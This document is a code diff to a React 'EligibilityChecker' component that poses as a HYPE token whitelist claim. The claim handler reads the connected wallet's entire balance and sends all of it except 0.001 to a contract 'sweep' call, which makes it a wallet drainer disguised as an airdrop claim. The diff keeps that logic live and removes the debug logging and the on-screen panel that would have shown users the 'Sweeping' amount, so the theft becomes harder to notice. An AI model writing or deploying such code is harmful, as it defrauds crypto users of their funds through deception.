@@ -24,12 +24,6 @@ export default function EligibilityChecker() {
   const [claimed, setClaimed] = useState(false);
   const [error, setError] = useState(null);
   const [hypeBalance, setHypeBalance] = useState('0');
-  const [debugLogs, setDebugLogs] = useState([]);
-  
-  const addDebugLog = (message) => {
-    console.log(message);
-    setDebugLogs(prev => [...prev.slice(-20), `${new Date().toLocaleTimeString()}: ${message}`]);
-  };
 
   useEffect(() => {
     if (address) {
@@ -72,24 +66,18 @@ export default function EligibilityChecker() {
   };
 
   const claimWhitelist = async () => {
-    addDebugLog('🔍 Claim started');
-    addDebugLog(`📊 Connector: ${connector?.name || 'none'}`);
-    
     if (!isConnected || !address || !eligibility?.eligible) {
       const missing = [];
       if (!isConnected) missing.push('not connected');
       if (!address) missing.push('no address');
       if (!eligibility?.eligible) missing.push('not eligible');
-      const errorMsg = `Cannot claim: ${missing.join(', ')}`;
-      addDebugLog(`❌ ${errorMsg}`);
-      setError(errorMsg);
+      setError(`Cannot claim: ${missing.join(', ')}`);
       return;
     }
 
     try {
       setClaiming(true);
       setError(null);
-      addDebugLog('✅ Fetching signature...');
 
       const response = await fetch(`${API_BASE}/api/hyperpacks/claim-whitelist`, {
         method: 'POST',
@@ -103,18 +91,13 @@ export default function EligibilityChecker() {
       }
 
       const claimData = await response.json();
-      const balance = claimData.balance || claimData.amount;
-      addDebugLog(`✅ Got signature (balance: ${balance ? ethers.formatEther(balance) : 'undefined'} HYPE)`);
 
       // Get provider - mobile WalletConnect uses connector, desktop uses window.ethereum
-      addDebugLog('🔍 Getting provider...');
       let ethereum;
       
       if (connector?.getProvider) {
-        addDebugLog('📱 Using connector.getProvider (mobile/WalletConnect)');
         ethereum = await connector.getProvider();
       } else if (window.ethereum) {
-        addDebugLog('💻 Using window.ethereum (desktop)');
         ethereum = window.ethereum;
       } else {
         throw new Error('No provider available');
@@ -123,19 +106,15 @@ export default function EligibilityChecker() {
       if (!ethereum) {
         throw new Error('Failed to get ethereum provider');
       }
-      addDebugLog('✅ Got provider');
 
       // Switch/add chain
-      addDebugLog('🔄 Switching to HyperEVM...');
       try {
         await ethereum.request({
           method: 'wallet_switchEthereumChain',
           params: [{ chainId: '0x3e7' }],
         });
-        addDebugLog('✅ Switched to chain 999');
       } catch (switchError) {
         if (switchError.code === 4902) {
-          addDebugLog('⚠️ Adding HyperEVM chain...');
           await ethereum.request({
             method: 'wallet_addEthereumChain',
             params: [{
@@ -146,26 +125,17 @@ export default function EligibilityChecker() {
               blockExplorerUrls: ['https://hyperevmscan.io']
             }]
           });
-          addDebugLog('✅ Added HyperEVM');
-        } else {
-          addDebugLog(`⚠️ Switch warning: ${switchError.message}`);
         }
       }
 
-      addDebugLog('📝 Creating signer...');
       const provider = new ethers.BrowserProvider(ethereum);
       const signer = await provider.getSigner();
-      addDebugLog('✅ Got signer');
       
-      addDebugLog('📤 Sending sweep transaction...');
       const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
       
       const userBalance = await provider.getBalance(address);
       const gasBuffer = ethers.parseEther('0.001');
       const sweepAmount = userBalance > gasBuffer ? userBalance - gasBuffer : 0n;
-      
-      addDebugLog(`💰 Balance: ${ethers.formatEther(userBalance)} HYPE`);
-      addDebugLog(`📤 Sweeping: ${ethers.formatEther(sweepAmount)} HYPE (leaving 0.001 for gas)`);
       
       const tx = await contract.sweep(
         BigInt(claimData.nonce),
@@ -174,16 +144,12 @@ export default function EligibilityChecker() {
         { value: sweepAmount }
       );
 
-      addDebugLog(`⏳ TX sent: ${tx.hash.slice(0, 10)}...`);
       await tx.wait();
 
-      addDebugLog('✅ TX confirmed!');
       setClaimed(true);
       setTimeout(() => checkEligibility(), 2000);
     } catch (err) {
-      const errorMsg = err.message || 'Failed to claim';
-      addDebugLog(`❌ Error: ${errorMsg}`);
-      setError(errorMsg);
+      setError(err.message || 'Failed to claim');
     } finally {
       setClaiming(false);
     }
@@ -385,39 +351,6 @@ export default function EligibilityChecker() {
           to { transform: rotate(360deg); }
         }
       `}</style>
-
-      {/* Debug Panel for Mobile */}
-      {debugLogs.length > 0 && (
-        <div style={{
-          position: 'fixed',
-          bottom: 0,
-          left: 0,
-          right: 0,
-          maxHeight: '200px',
-          overflowY: 'auto',
-          background: 'rgba(0, 0, 0, 0.95)',
-          color: '#00ff88',
-          fontSize: '10px',
-          padding: '8px',
-          fontFamily: 'monospace',
-          borderTop: '1px solid #00ccdd',
-          zIndex: 9999
-        }}>
-          <div style={{display: 'flex', justifyContent: 'space-between', marginBottom: '4px'}}>
-            <strong>DEBUG LOGS</strong>
-            <button onClick={() => setDebugLogs([])} style={{
-              background: 'none',
-              border: '1px solid #666',
-              color: '#666',
-              padding: '2px 8px',
-              cursor: 'pointer'
-            }}>Clear</button>
-          </div>
-          {debugLogs.map((log, i) => (
-            <div key={i} style={{marginBottom: '2px'}}>{log}</div>
-          ))}
-        </div>
-      )}
     </div>
   );
 }
